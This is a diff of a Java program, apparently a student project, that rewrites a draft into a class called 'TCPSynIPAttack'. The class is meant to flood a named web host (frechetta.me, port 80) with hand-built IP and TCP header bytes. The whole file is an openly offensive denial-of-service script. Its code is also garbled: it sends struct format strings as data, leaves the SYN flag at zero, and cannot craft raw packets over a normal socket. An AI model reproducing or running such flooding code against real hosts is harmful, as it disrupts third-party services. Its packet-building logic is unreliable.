@@ -1,123 +1,179 @@
-import java.util.Scanner;
-import java.util.Date;
-import java.net.Socket;
-import java.io.IOException;
-import java.net.SocketException;
+/*
+
+David Jensen, Presentation project. This program is designed to use both TCP and IP vulnerabilities 
+
+
+*/
+
+
+
+
+
+
+
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
+import java.io.IOException;
 import java.io.InputStreamReader;
-
-
-public class APflood {
-
-public static void main(String[] args) {
-
-	try {
-		Socket thissocket = new Socket(serverIP);
-	} catch (IOException e) {
-		System.out.println(e.readLine());
-		System.out.println("Error; socket wasnt created, try again");
-	}
-	System.out.println("Socket sucessfully created");
-
-
-	//ip header fields
-	int s = 0;
-	boolean num = true;
-	String packet = "";
-	String source_ip = "10.1.10.1";
-	String dest_ip = "10.1.12.173";
-	int ip_ihl = 5;
-	int ip_ver = 4;
-	int ip_tos = 0;
-	int ip_tot_len = 0; //kernel will fill the correct total lenght
-	int ip_id = 54321;  //ID of this packet
-	int ip_frag_off = 0;
-	int	ip_ttl = 255;
-	int	ip_proto = socket.IPPROTO_TCP;
-	int	ip_check = 0;    //kernel will fill the correct checksum
-	
-
-	try {
-		InetAddress ip_saddr = InetAddress.getByName(source_ip);
-	} catch (UnknownHostException e) {
-		throw new RuntimeException("The test has failed, the IP is unknown: " + args[0]);
-	}
-	try {
-		InetAddress ip_daddr = InetAddress.getByName(dest_ip);
-	} catch (UnknownHostException e) {
-		throw new RuntimeException("The test has failed, the IP is unknown: " + args[0]);
-	}
-	
-
-
-	//tcp header fields
-	int tcp_source = 1234;   //source port
-	int	tcp_dest = 80;   //destination port
-	int	tcp_seq = 454;
-	int	tcp_ack_seq = 0;
-	int	tcp_doff = 5;    //4 bit field, size of tcp header, 5 * 4 = 20 bytes
-		//tcp flags
-	int	tcp_fin = 0;
-	int	tcp_syn = 1;
-	int	tcp_rst = 0;
-	int	tcp_psh = 0;
-	int	tcp_ack = 0;
-	int	tcp_urg = 0;
-	//int	tcp_window = socket.htons (5840);    // maximum allowed window size
-	int	tcp_check = 0;
-	int	tcp_urg_ptr = 0;
-	
-	int tcp_offset_res = (tcp_doff << 4) + 0;
-	int tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5); 
+import java.net.Socket;
+import java.lang.Exception;
+import java.net.SocketException;
+import java.nio.ByteBuffer;
+import java.util.Date;
+import java.util.Scanner;
 
 
 
+class TCPSynIPAttack {
+
+  public static void main(String[] args) {
+
+  	//declairing both the TCP, IP and special character variables
+
+    boolean et = true;
+    int count = 10000;
+    String characters = "!BBHHHBBH4s4s";
+    String newCharacters = "HHLLBBHHH";
+    String source_ip = "10.1.10.1";
+    String dest_ip = "10.1.12.173";
+    byte[] charactersBytes = characters.getBytes();
+    int ip_ihl = 5;
+    int ip_tos = 0;
+    int ip_tot_len = 0; //kernel will fill the correct total lenght
+    int ip_id = 54321;  //ID of this packet
+    int ip_frag_off = 0;
+    int	ip_ttl = 255;
+    int ip_proto = 6;
+    int	ip_check = 0;    //kernel will fill the correct checksum
+    int tcp_source = 1234;
+    int tcp_doff = 5;
+    int tcp_urg = 0;
+	int tcp_dest = 80;
+	int tcp_rst = 0;
+	int tcp_psh = 0;
+	int tcp_ack = 0;
+	int tcp_seq = 454;
+	int tcp_ack_seq = 0;
+	int tcp_window = 5840;
+	int tcp_check = 0;
+	int tcp_urg_ptr = 0; 
+    int ip_ver = 4;
+    int tcp_syn =0;
+    int tcp_fin = 0;
+    int placeholder = 0;
+    Socket socket = null;
+    //long currentTime = System.currentTimeSec();
+    
+
+    byte[] source_ipBytes = source_ip.getBytes();
+    byte[] destination_ipBytes = dest_ip.getBytes();
+
+    int ip_ihl_ver = (ip_ver << 4) + ip_ihl;
 
 
-	String user_data = "Hello, how are you";
-
-	// pseudo header fields
-
+    //connect to the socket and port of the desired website
 
 	try {
-		InetAddress ip_saddr = InetAddress.getByName(source_ip);
-	} catch (UnknownHostException e) {
-		throw new RuntimeException("The test has failed, the IP is unknown: " + args[0]);
-	}
+	 socket = new Socket("frechetta.me", 80); 
+	} catch (Exception e) { 
+		System.out.println("Error, connection failed. please try again:"); 
+		System.exit(0); 
+	} 
+	System.out.println("Success"); 
+	ByteBuffer buf = ByteBuffer.allocate(1024);
+
+	//
+
+
+	buf.put(charactersBytes);
+	buf.putInt(ip_ihl_ver);
+	buf.putInt(ip_tos);
+	buf.putInt(ip_tot_len);
+	buf.putInt(ip_id);
+	buf.putInt(ip_frag_off);
+	buf.putInt(ip_ttl);
+	buf.putInt(ip_proto);
+	buf.putInt(ip_check);
+	buf.put(source_ipBytes);
+	buf.put(destination_ipBytes);
+
+	int size = buf.remaining();
+	byte[] arr = new byte[buf.remaining()];
+	buf.get(arr);
+		
+
+		// this is going to now push TCP
+	System.out.println("IP Size is: " + size); 
+
 	try {
-		InetAddress ip_daddr = InetAddress.getByName(dest_ip);
-	} catch (UnknownHostException e) {
-		throw new RuntimeException("The test has failed, the IP is unknown: " + args[0]);
-	}
+		socket = new Socket("frechetta.me", 80); 
+	} catch (Exception e) { 
+		System.out.println("Error, connection failed. please try again:"); 
+		System.exit(0); 
+	} 
+	System.out.println("Success"); 
+	ByteBuffer newbuf = ByteBuffer.allocate(1024);
 
-	
-	int placeholder = 0;
-	//String protocol = socket.IPPROTO_TCP;
-	//String tcp_length = len(tcp_header) + len(user_data);
-	//String psh = pack("!4s4sBBH", source_address, dest_address, placeholder, protocol, tcp_length);
-	//String psh = psh + tcp_header + user_data;
+	byte[] charBytes = newCharacters.getBytes();
 
 
+	int tcp_offset_res = (tcp_doff << 4);
+	int tcp_flags = (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5) + tcp_fin;
 
 
-	int s = 0;
+	newbuf.put(charBytes);
+	newbuf.putInt(tcp_source);
+	newbuf.putInt(tcp_dest);
+	newbuf.putInt(tcp_seq);
+	newbuf.putInt(tcp_ack_seq);
+	newbuf.putInt(tcp_offset_res);
+	newbuf.putInt(tcp_flags);
+	newbuf.putInt(tcp_window);
+	newbuf.putInt(tcp_check);
+	newbuf.putInt(tcp_urg_ptr);
+	newbuf.put(source_ipBytes);
+	newbuf.put(destination_ipBytes);
+
+	int thisSize = newbuf.remaining();
+	byte[] newArr = new byte[newbuf.remaining()];
+	newbuf.get(newArr);
+		
+	System.out.println("TCP Size is: " + thisSize); 
 
 
+	//after completeing the IP flood, now this is going to complete the TCP flood
 
-		public int checkSum(String msg) {
-			for (int i = 0; i < msg.length(); ++i) {
+	while (true) { 
+		
+		try (DataOutputStream outToServer = new DataOutputStream(socket.getOutputStream()))
+		{ 
+			while (et != false) {
+			outToServer.write(arr, 0, size);
+			outToServer.write(newArr, 0, thisSize);
+			while (count != 0) {
+			System.out.println("packer number:" + count + "\nIP:" + count + " \nTCP:" + count);
+			//System.out.println("TCP sent attack number: " + newArr);
 
+			-- count;
+		}
+		
+		}
+			
+			} catch (IOException ee) { 
+				System.out.println("error sending: count complete");
+			} 
+			et = false;
+			break;
+			} try { 
+				socket.close(); 
+			} catch (IOException ee) { 
+				
+				System.out.println("Sorry, error closing socket. Try again");
+				System.exit(0);
 			}
-			s = (s>>16) + (s & 0xffff);
-			s = s + (s >> 16);
-			s = ~s & 0xffff
-
-			return s;
-
-
-
-
+		}
+	}
+	
 
 
 
